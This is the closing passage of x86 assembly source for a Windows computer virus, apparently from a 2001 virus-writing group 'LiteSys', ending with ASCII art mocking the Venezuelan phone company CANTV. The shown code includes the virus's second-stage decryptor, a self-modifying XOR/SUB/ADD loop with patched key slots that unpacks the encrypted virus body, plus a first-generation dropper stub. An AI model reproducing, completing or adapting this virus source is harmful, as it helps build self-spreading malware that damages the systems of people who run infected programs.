  L_CRIPTA2                     EQU     $-CRIPTA2

  DB "(c) Junio-Agosto 2001 LiteSys. Hecho en Venezuela..."

  DB 14d DUP (00h)

  @Decriptor_2:

  LEA ESI, OFFSET [EBP + EMPIEZA_CRYPT]
  MOV ECX, (@Decriptor_2 - EMPIEZA_CRYPT) / 12

  @DC2:
   XOR DWORD PTR [ESI], 12345678h
   ORG $-4
   LLAVE2A                      DD      00000000h
   ADD ESI, 04h
   SUB DWORD PTR [ESI], 12345678h
   ORG $-4
   LLAVE2B                      DD      00000000h
   ADD ESI, 04h
   ADD DWORD PTR [ESI], 12345678h
   ORG $-4
   LLAVE2C                      DD      00000000h
   ADD ESI, 04h
  LOOP @DC2

  RET

  DB 12d DUP (90h)


  TAMA¥O_DEC2                   EQU     $-@Decriptor_2

  TERMINA_VIRUS         LABEL   NEAR

  _PrimGen:

    XOR EAX, EAX
    PUSH EAX
    PUSH OFFSET Titlo
    PUSH OFFSET Mensje
    PUSH EAX
    CALL MessageBoxA

    PUSH 0
    CALL ExitProcess
                                            
END ALMA

e s  l a  h o r a  d e  o t r o  e s t u p i d o  a s c i i  a r t . . .

                                               __
                            ________          | .| <- PONEME A MAMA!!!
                           |        |         | |
        .-----------------[  cantv  |   .-o-o-| |
        |                  |________|   |     | |.
        |                  |            |     |__| >- ¨EN 69?
      .-"-----+---.        |            |       
      | 1 2 3 |_H_|        |            |      
      | 4 5 6 |   |        |   .-o-o-o-o'      
      | 7 8 9 |___|        | .-'               
      | * 0 # |   |-o-o-o-o-o'
      `-------+---'        |
                           |
                           `--------< cantv te roba...
